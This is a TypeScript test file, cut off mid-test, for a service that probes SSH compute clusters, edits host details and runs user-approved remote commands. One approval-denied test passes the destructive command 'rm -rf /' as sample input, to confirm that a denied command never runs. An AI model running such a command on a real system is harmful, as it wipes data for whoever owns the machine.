import { mkdtemp, rm, writeFile } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { join } from 'node:path'

import { describe, expect, it, vi, afterEach, beforeEach } from 'vitest'

import type { ComputeHost } from '../../shared/compute'
import type { DownloadDest } from '../../shared/remote-fs'
import { ComputeService, parseProbeOutput } from './compute-service'
import type { ComputeApprovalBroker } from './compute-approval-broker'
import type { ComputeHostRepository } from './repository'
import type { ResolvedSshTarget, SshRunner } from './ssh-runner'
import type { ScpRunner } from './scp-runner'

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

const sampleHost = (overrides: Partial<ComputeHost> = {}): ComputeHost => ({
  id: 'host-1',
  providerId: 'ssh:biowulf',
  displayName: 'biowulf',
  shape: 'direct_ssh',
  sshAlias: 'biowulf',
  sshOverrides: undefined,
  scratchRoot: undefined,
  scratchPinned: false,
  concurrencyLimit: undefined,
  probeResult: undefined,
  detailsDoc: '',
  detailsUpdatedAt: undefined,
  detailsUpdatedBy: undefined,
  createdAt: 1,
  updatedAt: 1,
  ...overrides
})

// A fake target returned by the real resolveSshTarget helper — tests bypass that step by mocking the
// entire runner (which already has the target baked in).
const fakeTarget: ResolvedSshTarget = {
  sshBinary: '/usr/bin/ssh',
  host: 'biowulf.nih.gov',
  extraArgs: ['-o', 'BatchMode=yes', '-o', 'ConnectTimeout=10']
}

// Minimal fake runner — always resolves with a success result by default.
const makeFakeRunner = (result: Awaited<ReturnType<SshRunner['run']>>): SshRunner => ({
  run: vi.fn(() => Promise.resolve(result))
})

// Minimal repository double.
const makeRepo = (
  host: ComputeHost | null = sampleHost()
): {
  repo: ComputeHostRepository
  updateProbeResult: ReturnType<typeof vi.fn>
  updateScratchRoot: ReturnType<typeof vi.fn>
  updateDetails: ReturnType<typeof vi.fn>
  updateScratchPinned: ReturnType<typeof vi.fn>
  updateConcurrencyLimit: ReturnType<typeof vi.fn>
} => {
  const updateProbeResult = vi.fn(() => Promise.resolve())
  const updateScratchRoot = vi.fn(() => Promise.resolve())
  const updateDetails = vi.fn(() => Promise.resolve())
  const updateScratchPinned = vi.fn(() => Promise.resolve())
  const updateConcurrencyLimit = vi.fn(() => Promise.resolve())
  const repo: ComputeHostRepository = {
    get: vi.fn(() => Promise.resolve(host)),
    list: vi.fn(() => Promise.resolve([])),
    create: vi.fn(),
    delete: vi.fn(),
    updateProbeResult,
    updateScratchRoot,
    updateDetails,
    updateScratchPinned,
    updateConcurrencyLimit
  } as unknown as ComputeHostRepository
  return {
    repo,
    updateProbeResult,
    updateScratchRoot,
    updateDetails,
    updateScratchPinned,
    updateConcurrencyLimit
  }
}

// A successful probe script output representing a Linux slurm cluster.
const SLURM_STDOUT = [
  'os=Linux',
  'cpus=64',
  'mem_mib=256000',
  'gpus=Tesla V100 SXM2 32GB;Tesla V100 SXM2 32GB;',
  'sbatch=yes',
  'qsub=no',
  'bsub=no',
  'scratch=/gpfs/scratch/user123'
].join('\n')

// ---------------------------------------------------------------------------
// parseProbeOutput — pure function tests
// ---------------------------------------------------------------------------

describe('parseProbeOutput', () => {
  it('parses a complete slurm linux output', () => {
    const result = parseProbeOutput(SLURM_STDOUT)
    expect(result.os).toBe('Linux')
    expect(result.cpus).toBe(64)
    expect(result.memMib).toBe(256000)
    expect(result.gpus).toEqual([{ type: 'Tesla V100 SXM2 32GB', count: 2 }])
    expect(result.detectedScheduler).toBe('slurm')
    expect(result.scratchEnv).toBe('/gpfs/scratch/user123')
  })

  it('detects PBS (qsub) scheduler', () => {
    const out = 'os=Linux\ncpus=8\nmem_mib=32000\ngpus=\nsbatch=no\nqsub=yes\nbsub=no\nscratch='
    const result = parseProbeOutput(out)
    expect(result.detectedScheduler).toBe('pbs')
  })

  it('detects LSF (bsub) scheduler', () => {
    const out = 'os=Linux\ncpus=8\nmem_mib=32000\ngpus=\nsbatch=no\nqsub=no\nbsub=yes\nscratch='
    const result = parseProbeOutput(out)
    expect(result.detectedScheduler).toBe('lsf')
  })

  it('returns none when no scheduler is detected', () => {
    const out = 'os=Darwin\ncpus=16\nmem_mib=65536\ngpus=\nsbatch=no\nqsub=no\nbsub=no\nscratch='
    const result = parseProbeOutput(out)
    expect(result.detectedScheduler).toBe('none')
  })

  it('handles empty GPU list gracefully', () => {
    const out = 'os=Linux\ncpus=4\nmem_mib=8000\ngpus=\nsbatch=no\nqsub=no\nbsub=no\nscratch='
    const result = parseProbeOutput(out)
    expect(result.gpus).toEqual([])
  })

  it('leaves undefined for missing / non-numeric cpus and mem', () => {
    const result = parseProbeOutput('os=Linux\ngpus=\nsbatch=no\nqsub=no\nbsub=no\nscratch=')
    expect(result.cpus).toBeUndefined()
    expect(result.memMib).toBeUndefined()
  })

  it('ignores lines without an equals sign', () => {
    const result = parseProbeOutput('this is garbage\nos=Linux\ncpus=4\n')
    expect(result.os).toBe('Linux')
    expect(result.cpus).toBe(4)
  })

  it('leaves scratchEnv undefined when the env var is empty', () => {
    const out = 'os=Linux\ncpus=8\nmem_mib=16000\ngpus=\nsbatch=no\nqsub=no\nbsub=no\nscratch='
    const result = parseProbeOutput(out)
    expect(result.scratchEnv).toBeUndefined()
  })

  it('aggregates multiple identical GPU models into one entry', () => {
    const out = 'gpus=A100 80GB;A100 80GB;A100 80GB;\nsbatch=no\nqsub=no\nbsub=no\nscratch='
    const result = parseProbeOutput(out)
    expect(result.gpus).toEqual([{ type: 'A100 80GB', count: 3 }])
  })
})

// ---------------------------------------------------------------------------
// ComputeService.probe — integration with fake SshRunner
// ---------------------------------------------------------------------------

// We use vi.mock for resolveSshTarget so the tests don't spawn ssh.
vi.mock('./ssh-runner', async (importOriginal) => {
  const orig = await importOriginal<typeof import('./ssh-runner')>()
  return {
    ...orig,
    resolveSshTarget: vi.fn(() => Promise.resolve(fakeTarget))
  }
})

describe('ComputeService.probe', () => {
  it('returns ok:true and persists probeResult + shape on a successful probe', async () => {
    const runner = makeFakeRunner({
      exitCode: 0,
      stdout: SLURM_STDOUT,
      stderr: '',
      truncated: false,
      timedOut: false
    })
    const { repo, updateProbeResult, updateScratchRoot } = makeRepo()
    const service = new ComputeService(runner, repo)

    const result = await service.probe('ssh:biowulf')

    expect(result.ok).toBe(true)
    expect(result.exitCode).toBe(0)
    expect(result.cpus).toBe(64)
    expect(result.detectedScheduler).toBe('slurm')
    expect(updateProbeResult).toHaveBeenCalledWith(
      'ssh:biowulf',
      expect.objectContaining({ ok: true, cpus: 64 }),
      'scheduler_cluster'
    )
    // scratchRoot should be set because scratchPinned=false and scratch is provided.
    expect(updateScratchRoot).toHaveBeenCalledWith('ssh:biowulf', '/gpfs/scratch/user123')
  })

  it('returns ok:false and maps exit 255 to host_unreachable (connection failure)', async () => {
    const runner = makeFakeRunner({
      exitCode: 255,
      stdout: '',
      stderr: 'ssh: connect to host biowulf.nih.gov port 22: Connection refused',
      truncated: false,
      timedOut: false
    })
    const { repo, updateProbeResult, updateScratchRoot } = makeRepo()
    const service = new ComputeService(runner, repo)

    const result = await service.probe('ssh:biowulf')

    expect(result.ok).toBe(false)
    expect(result.exitCode).toBe(255)
    expect(result.errorTail).toContain('Connection refused')
    expect(updateProbeResult).toHaveBeenCalledWith(
      'ssh:biowulf',
      expect.objectContaining({ ok: false }),
      'direct_ssh'
    )
    expect(updateScratchRoot).not.toHaveBeenCalled()
  })

  it('returns ok:false on timeout and sets timedOut flag', async () => {
    const runner = makeFakeRunner({
      exitCode: null,
      stdout: '',
      stderr: '',
      truncated: false,
      timedOut: true
    })
    const { repo, updateProbeResult } = makeRepo()
    const service = new ComputeService(runner, repo)

    const result = await service.probe('ssh:biowulf')

    expect(result.ok).toBe(false)
    expect(updateProbeResult).toHaveBeenCalledWith(
      'ssh:biowulf',
      expect.objectContaining({ ok: false }),
      'direct_ssh'
    )
  })

  it('probes ok but detectedScheduler=none → shape=direct_ssh', async () => {
    const stdout = [
      'os=Darwin',
      'cpus=16',
      'mem_mib=32000',
      'gpus=',
      'sbatch=no',
      'qsub=no',
      'bsub=no',
      'scratch='
    ].join('\n')
    const runner = makeFakeRunner({
      exitCode: 0,
      stdout,
      stderr: '',
      truncated: false,
      timedOut: false
    })
    const { repo, updateProbeResult } = makeRepo()
    const service = new ComputeService(runner, repo)

    const result = await service.probe('ssh:biowulf')

    expect(result.ok).toBe(true)
    expect(result.detectedScheduler).toBe('none')
    expect(updateProbeResult).toHaveBeenCalledWith(
      'ssh:biowulf',
      expect.objectContaining({ ok: true }),
      'direct_ssh'
    )
  })

  it('does NOT update scratchRoot when scratchPinned=true', async () => {
    const runner = makeFakeRunner({
      exitCode: 0,
      stdout: SLURM_STDOUT,
      stderr: '',
      truncated: false,
      timedOut: false
    })
    const pinnedHost = sampleHost({ scratchPinned: true, scratchRoot: '/my/custom/scratch' })
    const { repo, updateScratchRoot } = makeRepo(pinnedHost)
    const service = new ComputeService(runner, repo)

    await service.probe('ssh:biowulf')

    expect(updateScratchRoot).not.toHaveBeenCalled()
  })

  it('does NOT update scratchRoot when $SCRATCH is empty', async () => {
    const stdout = 'os=Linux\ncpus=8\nmem_mib=16000\ngpus=\nsbatch=no\nqsub=no\nbsub=no\nscratch='
    const runner = makeFakeRunner({
      exitCode: 0,
      stdout,
      stderr: '',
      truncated: false,
      timedOut: false
    })
    const { repo, updateScratchRoot } = makeRepo()
    const service = new ComputeService(runner, repo)

    await service.probe('ssh:biowulf')

    expect(updateScratchRoot).not.toHaveBeenCalled()
  })

  it('does NOT write detailsDoc', async () => {
    const runner = makeFakeRunner({
      exitCode: 0,
      stdout: SLURM_STDOUT,
      stderr: '',
      truncated: false,
      timedOut: false
    })
    const { repo, updateProbeResult } = makeRepo()
    const service = new ComputeService(runner, repo)

    await service.probe('ssh:biowulf')

    // Verify that probeResult is the only "content" written.
    const probeCall = updateProbeResult.mock.calls[0]
    const writtenResult = probeCall?.[1] as Record<string, unknown>
    expect(Object.keys(writtenResult)).not.toContain('detailsDoc')
  })

  it('throws when the host does not exist', async () => {
    const runner = makeFakeRunner({
      exitCode: 0,
      stdout: '',
      stderr: '',
      truncated: false,
      timedOut: false
    })
    const { repo } = makeRepo(null)
    const service = new ComputeService(runner, repo)

    await expect(service.probe('ssh:nonexistent')).rejects.toThrow(/not found|no compute host/i)
  })
})

// ---------------------------------------------------------------------------
// ComputeService.getDetails — skeleton synthesis and pass-through
// ---------------------------------------------------------------------------

describe('ComputeService.getDetails', () => {
  const fakeRunner = makeFakeRunner({
    exitCode: 0,
    stdout: '',
    stderr: '',
    truncated: false,
    timedOut: false
  })

  it('returns detailsDoc as-is when it is non-empty', async () => {
    const { repo } = makeRepo(sampleHost({ detailsDoc: '## Resources\ncpus: 8' }))
    const service = new ComputeService(fakeRunner, repo)
    const result = await service.getDetails('ssh:biowulf')
    expect(result.doc).toBe('## Resources\ncpus: 8')
    expect(result.isSkeleton).toBe(false)
  })

  it('returns a skeleton from probeResult when detailsDoc is empty', async () => {
    const probeResult = {
      ok: true,
      probedAt: '2026-01-01T00:00:00Z',
      exitCode: 0,
      errorTail: null,
      cpus: 64,
      memMib: 256000,
      gpus: [{ type: 'A100 80GB', count: 2 }],
      detectedScheduler: 'slurm' as const
    }
    const { repo } = makeRepo(sampleHost({ detailsDoc: '', probeResult }))
    const service = new ComputeService(fakeRunner, repo)
    const result = await service.getDetails('ssh:biowulf')
    expect(result.isSkeleton).toBe(true)
    expect(result.doc).toContain('## Resources')
    expect(result.doc).toContain('cpus:')
    expect(result.doc).toContain('mem:')
    expect(result.doc).toContain('gpus:')
    expect(result.doc).toContain('scheduler:')
  })

  it('returns a skeleton with only available fields when some are missing', async () => {
    const probeResult = {
      ok: true,
      probedAt: '2026-01-01T00:00:00Z',
      exitCode: 0,
      errorTail: null,
      cpus: 8
    }
    const { repo } = makeRepo(sampleHost({ detailsDoc: '', probeResult }))
    const service = new ComputeService(fakeRunner, repo)
    const result = await service.getDetails('ssh:biowulf')
    expect(result.isSkeleton).toBe(true)
    expect(result.doc).toContain('cpus: 8')
    expect(result.doc).not.toContain('gpus:')
    expect(result.doc).not.toContain('mem:')
  })

  it('returns empty string with isSkeleton=false when no probeResult and detailsDoc is empty', async () => {
    const { repo } = makeRepo(sampleHost({ detailsDoc: '', probeResult: undefined }))
    const service = new ComputeService(fakeRunner, repo)
    const result = await service.getDetails('ssh:biowulf')
    expect(result.doc).toBe('')
    expect(result.isSkeleton).toBe(false)
  })

  it('throws when the host does not exist', async () => {
    const { repo } = makeRepo(null)
    const service = new ComputeService(fakeRunner, repo)
    await expect(service.getDetails('ssh:nonexistent')).rejects.toThrow(
      /not found|no compute host/i
    )
  })
})

// ---------------------------------------------------------------------------
// ComputeService.replaceDetails — old_text guard and persistence
// ---------------------------------------------------------------------------

describe('ComputeService.replaceDetails', () => {
  const fakeRunner = makeFakeRunner({
    exitCode: 0,
    stdout: '',
    stderr: '',
    truncated: false,
    timedOut: false
  })

  it('replaces matching text and persists with author=user', async () => {
    const { repo, updateDetails } = makeRepo(sampleHost({ detailsDoc: 'hello world' }))
    const service = new ComputeService(fakeRunner, repo)
    await service.replaceDetails('ssh:biowulf', {
      text: 'hello friend',
      oldText: 'hello world',
      author: 'user'
    })
    expect(updateDetails).toHaveBeenCalledWith('ssh:biowulf', 'hello friend', 'user')
  })

  it('returns error and does not write when oldText does not match', async () => {
    const { repo, updateDetails } = makeRepo(sampleHost({ detailsDoc: 'hello world' }))
    const service = new ComputeService(fakeRunner, repo)
    await expect(
      service.replaceDetails('ssh:biowulf', {
        text: 'something',
        oldText: 'not present',
        author: 'user'
      })
    ).rejects.toThrow(/not found|does not match|old_text/i)
    expect(updateDetails).not.toHaveBeenCalled()
  })

  it('rejects when resulting doc exceeds 32768 characters', async () => {
    const { repo, updateDetails } = makeRepo(sampleHost({ detailsDoc: 'short' }))
    const service = new ComputeService(fakeRunner, repo)
    const bigText = 'x'.repeat(32769)
    await expect(
      service.replaceDetails('ssh:biowulf', { text: bigText, oldText: 'short', author: 'user' })
    ).rejects.toThrow(/32768|too long|limit/i)
    expect(updateDetails).not.toHaveBeenCalled()
  })

  it('works with author=agent', async () => {
    const { repo, updateDetails } = makeRepo(sampleHost({ detailsDoc: 'original text' }))
    const service = new ComputeService(fakeRunner, repo)
    await service.replaceDetails('ssh:biowulf', {
      text: 'new text',
      oldText: 'original text',
      author: 'agent'
    })
    expect(updateDetails).toHaveBeenCalledWith('ssh:biowulf', 'new text', 'agent')
  })
})

// ---------------------------------------------------------------------------
// ComputeService.setScratchRoot — sets scratchPinned=true
// ---------------------------------------------------------------------------

describe('ComputeService.setScratchRoot', () => {
  const fakeRunner = makeFakeRunner({
    exitCode: 0,
    stdout: '',
    stderr: '',
    truncated: false,
    timedOut: false
  })

  it('sets scratch root and marks pinned', async () => {
    const { repo, updateScratchPinned } = makeRepo()
    const service = new ComputeService(fakeRunner, repo)
    await service.setScratchRoot('ssh:biowulf', '/my/scratch')
    expect(updateScratchPinned).toHaveBeenCalledWith('ssh:biowulf', '/my/scratch')
  })

  it('throws when the host does not exist', async () => {
    const { repo } = makeRepo(null)
    const service = new ComputeService(fakeRunner, repo)
    await expect(service.setScratchRoot('ssh:nonexistent', '/path')).rejects.toThrow(
      /not found|no compute host/i
    )
  })
})

// ---------------------------------------------------------------------------
// ComputeService.setConcurrencyLimit — validates 1..500
// ---------------------------------------------------------------------------

describe('ComputeService.setConcurrencyLimit', () => {
  const fakeRunner = makeFakeRunner({
    exitCode: 0,
    stdout: '',
    stderr: '',
    truncated: false,
    timedOut: false
  })

  it('persists a valid concurrency limit', async () => {
    const { repo, updateConcurrencyLimit } = makeRepo()
    const service = new ComputeService(fakeRunner, repo)
    await service.setConcurrencyLimit('ssh:biowulf', 10)
    expect(updateConcurrencyLimit).toHaveBeenCalledWith('ssh:biowulf', 10)
  })

  it('rejects 0 (below minimum)', async () => {
    const { repo } = makeRepo()
    const service = new ComputeService(fakeRunner, repo)
    await expect(service.setConcurrencyLimit('ssh:biowulf', 0)).rejects.toThrow(
      /1.*500|range|invalid/i
    )
  })

  it('rejects 501 (above maximum)', async () => {
    const { repo } = makeRepo()
    const service = new ComputeService(fakeRunner, repo)
    await expect(service.setConcurrencyLimit('ssh:biowulf', 501)).rejects.toThrow(
      /1.*500|range|invalid/i
    )
  })

  it('accepts the boundary values 1 and 500', async () => {
    const { repo, updateConcurrencyLimit } = makeRepo()
    const service = new ComputeService(fakeRunner, repo)
    await service.setConcurrencyLimit('ssh:biowulf', 1)
    await service.setConcurrencyLimit('ssh:biowulf', 500)
    expect(updateConcurrencyLimit).toHaveBeenCalledTimes(2)
  })

  it('throws when the host does not exist', async () => {
    const { repo } = makeRepo(null)
    const service = new ComputeService(fakeRunner, repo)
    await expect(service.setConcurrencyLimit('ssh:nonexistent', 10)).rejects.toThrow(
      /not found|no compute host/i
    )
  })
})

// ---------------------------------------------------------------------------
// ComputeService.callCommand — fake SshRunner + fake approval broker
// ---------------------------------------------------------------------------

// A minimal fake approval broker that resolves instantly.
const makeApprovalBroker = (decision: 'once' | 'deny'): ComputeApprovalBroker =>
  ({
    request: vi.fn(() => Promise.resolve(decision)),
    respond: vi.fn()
  }) as unknown as ComputeApprovalBroker

describe('ComputeService.callCommand', () => {
  it('returns ExecResult on success with correct fields', async () => {
    const runner = makeFakeRunner({
      exitCode: 0,
      stdout: 'hello world',
      stderr: '',
      truncated: false,
      timedOut: false
    })
    const { repo } = makeRepo()
    const broker = makeApprovalBroker('once')
    const service = new ComputeService(runner, repo, broker)

    const result = await service.callCommand('ssh:biowulf', 'echo hello', 'test intent')

    expect(result.exit_code).toBe(0)
    expect(result.stdout).toBe('hello world')
    expect(result.stderr).toBe('')
    expect(result.truncated).toBe(false)
  })

  it('calls runner with login shell when loginShell=true', async () => {
    const runMock = vi.fn(() =>
      Promise.resolve({ exitCode: 0, stdout: '', stderr: '', truncated: false, timedOut: false })
    )
    const runner: SshRunner = { run: runMock }
    const { repo } = makeRepo()
    const service = new ComputeService(runner, repo, makeApprovalBroker('once'))

    await service.callCommand('ssh:biowulf', 'echo hi', 'intent', true)

    expect(runMock).toHaveBeenCalledWith(
      expect.anything(),
      expect.stringContaining('echo hi'),
      expect.objectContaining({ loginShell: true })
    )
  })

  it('wraps command with scratchRoot cd when configured', async () => {
    const runMock = vi.fn(() =>
      Promise.resolve({ exitCode: 0, stdout: '', stderr: '', truncated: false, timedOut: false })
    )
    const runner: SshRunner = { run: runMock }
    const host = sampleHost({ scratchRoot: '/scratch/user' })
    const { repo } = makeRepo(host)
    const service = new ComputeService(runner, repo, makeApprovalBroker('once'))

    await service.callCommand('ssh:biowulf', 'ls', 'list files')

    const calledCmd = (runMock.mock.calls[0] as unknown as [unknown, string])?.[1]
    expect(calledCmd).toContain('/scratch/user')
    expect(calledCmd).toContain('ls')
  })

  it('falls back to cd ~ when no scratchRoot is configured', async () => {
    const runMock = vi.fn(() =>
      Promise.resolve({ exitCode: 0, stdout: '', stderr: '', truncated: false, timedOut: false })
    )
    const runner: SshRunner = { run: runMock }
    const { repo } = makeRepo(sampleHost({ scratchRoot: undefined }))
    const service = new ComputeService(runner, repo, makeApprovalBroker('once'))

    await service.callCommand('ssh:biowulf', 'ls', 'list files')

    const calledCmd = (runMock.mock.calls[0] as unknown as [unknown, string])?.[1]
    expect(calledCmd).toContain('cd ~')
  })

  it('uses default 60s timeout when not specified', async () => {
    const runMock = vi.fn(() =>
      Promise.resolve({ exitCode: 0, stdout: '', stderr: '', truncated: false, timedOut: false })
    )
    const runner: SshRunner = { run: runMock }
    const { repo } = makeRepo()
    const service = new ComputeService(runner, repo, makeApprovalBroker('once'))

    await service.callCommand('ssh:biowulf', 'echo hi', 'intent')

    expect(runMock).toHaveBeenCalledWith(
      expect.anything(),
      expect.anything(),
      expect.objectContaining({ timeoutMs: 60_000 })
    )
  })

  it('uses caller-provided timeout when specified', async () => {
    const runMock = vi.fn(() =>
      Promise.resolve({ exitCode: 0, stdout: '', stderr: '', truncated: false, timedOut: false })
    )
    const runner: SshRunner = { run: runMock }
    const { repo } = makeRepo()
    const service = new ComputeService(runner, repo, makeApprovalBroker('once'))

    await service.callCommand('ssh:biowulf', 'echo hi', 'intent', true, 120)

    expect(runMock).toHaveBeenCalledWith(
      expect.anything(),
      expect.anything(),
      expect.objectContaining({ timeoutMs: 120_000 })
    )
  })

  it('throws approval_denied when user denies', async () => {
    const runner = makeFakeRunner({
      exitCode: 0,
      stdout: '',
      stderr: '',
      truncated: false,
      timedOut: false
    })
    const { repo } = makeRepo()
    const service = new ComputeService(runner, repo, makeApprovalBroker('deny'))

    const err = await service.callCommand('ssh:biowulf', 'rm -rf /', 'cleanup').catch((e) => e)

    expect(err).toBeInstanceOf(Error)
    expect(err.computeCallError?.error_code).toBe('approval_denied')
    expect(err.computeCallError?.retry_after_user_action).toBe(false)
  })

  it('throws host_unreachable on ssh exit 255', async () => {
    const runner = makeFakeRunner({
      exitCode: 255,
      stdout: '',
      stderr: 'ssh: connect to host biowulf port 22: Connection refused',
      truncated: false,
      timedOut: false
    })
    const { repo } = makeRepo()
    const service = new ComputeService(runner, repo, makeApprovalBroker('once'))

    const err = await service.callCommand('ssh:biowulf', 'echo hi', 'intent').catch((e) => e)

    expect(err.computeCallError?.error_code).toBe('host_unreachable')
    expect(err.computeCallError?.retry_after_user_action).toBe(true)
  })

  it('throws timeout when the runner times out', async () => {
    const runner = makeFakeRunner({
      exitCode: null,
      stdout: '',
      stderr: '',
      truncated: false,
      timedOut: true
    })
    const { repo } = makeRepo()
    const service = new ComputeService(runner, repo, makeApprovalBroker('once'))

    const err = await service.callCommand('ssh:biowulf', 'sleep 9999', 'long sleep').catch((e) => e)

    expect(err.computeCallError?.error_code).toBe('timeout')
    expect(err.computeCallError?.retry_after_user_action).toBe(false)
  })

  it('passes truncated=true when output is capped', async () => {
    const runner = makeFakeRunner({
      exitCode: 0,
      stdout: 'large output',
      stderr: '',
      truncated: true,
      timedOut: false
    })
    const { repo } = makeRepo()
    const service = new ComputeService(runner, repo, makeApprovalBroker('once'))

    const result = await service.callCommand('ssh:biowulf', 'cat big_file', 'read file')

    expect(result.truncated).toBe(true)
  })

  it('fires approval BEFORE any ssh run call', async () => {
    const runMock = vi.fn(() =>
      Promise.resolve({ exitCode: 0, stdout: '', stderr: '', truncated: false, timedOut: false })
    )
    const runner: SshRunner = { run: runMock }
    const callOrder: string[] = []
    const broker: ComputeApprovalBroker = {
      request: vi.fn(() => {
        callOrder.push('approval')
        return Promise.resolve('once' as const)
      }),
      respond: vi.fn()
    } as unknown as ComputeApprovalBroker
    // Override run to record call order AFTER approval mock records its order.
    ;(runMock as ReturnType<typeof vi.fn>).mockImplementation(() => {
      callOrder.push('ssh')
      return Promise.resolve({
        exitCode: 0,
        stdout: '',
        stderr: '',
        truncated: false,
        timedOut: false
      })
    })
    const { repo } = makeRepo()
    const service = new ComputeService(runner, repo, broker)

    await service.callCommand('ssh:biowulf', 'echo hi', 'intent')

    expect(callOrder).toEqual(['approval', 'ssh'])
  })

  it('throws when no approval broker is injected', async () => {
    const runner = makeFakeRunner({
      exitCode: 0,
      stdout: '',
      stderr: '',
      truncated: false,
      timedOut: false
    })
    const { repo } = makeRepo()
    // No broker injected
    const service = new ComputeService(runner, repo)

    await expect(service.callCommand('ssh:biowulf', 'echo hi', 'intent')).rejects.toThrow(
      /approval.*broker|required/i
    )
  })
})

// ---------------------------------------------------------------------------
// ComputeService.listDir — fake SshRunner
// ---------------------------------------------------------------------------

// Helper to build a single NUL-terminated find -printf record.
const findRecord = (type: string, size: number, mtime: number, name: string): string =>
  `${type}\t${size}\t${mtime}\t${name}\0`

// Build a mock stdout for listDir: realpath\nhome\nfind_output
const buildListDirStdout = (resolvedPath: string, home: string, findOutput: string): string =>
  `${resolvedPath}\n${home}\n${findOutput}`

describe('ComputeService.listDir', () => {
  it('resolves path, home, scratch from stdout and returns sorted entries', async () => {
    const findOut = [
      findRecord('f', 2048, 1704067200.0, 'zebra.txt'),
      findRecord('d', 0, 1704067200.0, 'beta'),
      findRecord('f', 512, 1704067200.0, 'alpha.txt'),
      findRecord('d', 0, 1704067200.0, 'alpha')
    ].join('')
    const stdout = buildListDirStdout('/resolved/path', '/home/user', findOut)

    const runner = makeFakeRunner({
      exitCode: 0,
      stdout,
      stderr: '',
      truncated: false,
      timedOut: false
    })
    const { repo } = makeRepo(sampleHost({ scratchRoot: '/scratch/user' }))
    const service = new ComputeService(runner, repo)

    const result = await service.listDir('ssh:biowulf', '/some/path')

    expect(result.resolvedPath).toBe('/resolved/path')
    expect(result.roots.home).toBe('/home/user')
    expect(result.roots.scratch).toBe('/scratch/user')
    expect(result.truncated).toBe(false)
    expect(result.entries.map((e) => e.name)).toEqual(['alpha', 'beta', 'alpha.txt', 'zebra.txt'])
    expect(result.entries[0]?.isDirectory).toBe(true)
    expect(result.entries[2]?.isDirectory).toBe(false)
  })

  it('truncates at 5000 entries and sets truncated=true', async () => {
    const findOut = Array.from({ length: 5001 }, (_, i) =>
      findRecord('f', i, 1704067200.0, `file${String(i).padStart(5, '0')}.txt`)
    ).join('')
    const stdout = buildListDirStdout('/path', '/home/user', findOut)

    const runner = makeFakeRunner({
      exitCode: 0,
      stdout,
      stderr: '',
      truncated: false,
      timedOut: false
    })
    const { repo } = makeRepo()
    const service = new ComputeService(runner, repo)

    const result = await service.listDir('ssh:biowulf', '/path')

    expect(result.truncated).toBe(true)
    expect(result.entries).toHaveLength(5000)
  })

  it('sets truncated=false when exactly 5000 entries', async () => {
    const findOut = Array.from({ length: 5000 }, (_, i) =>
      findRecord('f', i, 1704067200.0, `file${i}.txt`)
    ).join('')
    const stdout = buildListDirStdout('/path', '/home/user', findOut)

    const runner = makeFakeRunner({
      exitCode: 0,
      stdout,
      stderr: '',
      truncated: false,
      timedOut: false
    })
    const { repo } = makeRepo()
    const service = new ComputeService(runner, repo)

    const result = await service.listDir('ssh:biowulf', '/path')

    expect(result.truncated).toBe(false)
    expect(result.entries).toHaveLength(5000)
  })

  it('returns empty entries for an empty directory', async () => {
    const stdout = buildListDirStdout('/path', '/home/user', '')

    const runner = makeFakeRunner({
      exitCode: 0,
      stdout,
      stderr: '',
      truncated: false,
      timedOut: false
    })
    const { repo } = makeRepo()
    const service = new ComputeService(runner, repo)

    const result = await service.listDir('ssh:biowulf', '/path')

    expect(result.entries).toEqual([])
    expect(result.truncated).toBe(false)
  })

  it('omits roots.scratch when host has no scratchRoot', async () => {
    const stdout = buildListDirStdout('/path', '/home/user', '')
    const runner = makeFakeRunner({
      exitCode: 0,
      stdout,
      stderr: '',
      truncated: false,
      timedOut: false
    })
    const { repo } = makeRepo(sampleHost({ scratchRoot: undefined }))
    const service = new ComputeService(runner, repo)

    const result = await service.listDir('ssh:biowulf', '/path')

    expect(result.roots.scratch).toBeUndefined()
    expect(result.roots.home).toBe('/home/user')
  })

  it('passes maxOutputBytes ~2MB to the runner', async () => {
    const runMock = vi.fn(() =>
      Promise.resolve({
        exitCode: 0,
        stdout: buildListDirStdout('/path', '/home/user', ''),
        stderr: '',
        truncated: false,
        timedOut: false
      })
    )
    const runner: SshRunner = { run: runMock }
    const { repo } = makeRepo()
    const service = new ComputeService(runner, repo)

    await service.listDir('ssh:biowulf', '/path')

    const opts = (
      runMock.mock.calls[0] as unknown as [unknown, unknown, { maxOutputBytes?: number }]
    )?.[2]
    expect(opts?.maxOutputBytes).toBeGreaterThanOrEqual(1024 * 1024)
  })

  it('throws not_found when stderr says no such file', async () => {
    const runner = makeFakeRunner({
      exitCode: 1,
      stdout: '',
      stderr: 'realpath: /no/such/path: No such file or directory',
      truncated: false,
      timedOut: false
    })
    const { repo } = makeRepo()
    const service = new ComputeService(runner, repo)

    const err = await service.listDir('ssh:biowulf', '/no/such/path').catch((e) => e)
    expect(err.remoteFsError?.remoteKind).toBe('not_found')
  })

  it('throws connection on ssh exit 255', async () => {
    const runner = makeFakeRunner({
      exitCode: 255,
      stdout: '',
      stderr: 'ssh: connect to host biowulf port 22: Connection refused',
      truncated: false,
      timedOut: false
    })
    const { repo } = makeRepo()
    const service = new ComputeService(runner, repo)

    const err = await service.listDir('ssh:biowulf', '/path').catch((e) => e)
    expect(err.remoteFsError?.remoteKind).toBe('connection')
    expect(err.remoteFsError?.retry_after_user_action).toBe(true)
  })

  // Regression guard for the "silent fallback to $HOME" bug: the remote command must abort on a
  // failed `cd` (nonzero exit) rather than swallowing it with `|| true`, and must NOT fold cd's
  // stderr into stdout (`2>&1`) — stderr has to reach classifyRemoteError intact.
  it('builds a remote command that aborts on cd failure and preserves cd stderr', async () => {
    const runMock = vi.fn(() =>
      Promise.resolve({
        exitCode: 0,
        stdout: buildListDirStdout('/path', '/home/user', ''),
        stderr: '',
        truncated: false,
        timedOut: false
      })
    )
    const runner: SshRunner = { run: runMock }
    const { repo } = makeRepo()
    const service = new ComputeService(runner, repo)

    await service.listDir('ssh:biowulf', '/path')

    const remoteCmd = (runMock.mock.calls[0] as unknown as [unknown, string])?.[1]
    expect(remoteCmd).toContain('cd ')
    expect(remoteCmd).toContain('|| exit 1')
    // The bug lived here: `|| true` swallowed the failure and `2>&1` hid the reason.
    expect(remoteCmd).not.toContain('|| true')
    expect(remoteCmd).not.toContain('cd "/path" 2>&1')
  })

  // End-to-end of the fix: when `cd` into a nonexistent dir fails, the remote shell exits nonzero
  // with cd's stderr — this must throw (not_found), never silently list $HOME.
  it('throws not_found when cd into a nonexistent path fails', async () => {
    const runner = makeFakeRunner({
      exitCode: 1,
      // realpath echoed the raw path to stdout, then cd failed to stderr and `exit 1` aborted.
      stdout: '/no/such/path\n',
      stderr: 'bash: line 2: cd: /no/such/path: No such file or directory',
      truncated: false,
      timedOut: false
    })
    const { repo } = makeRepo()
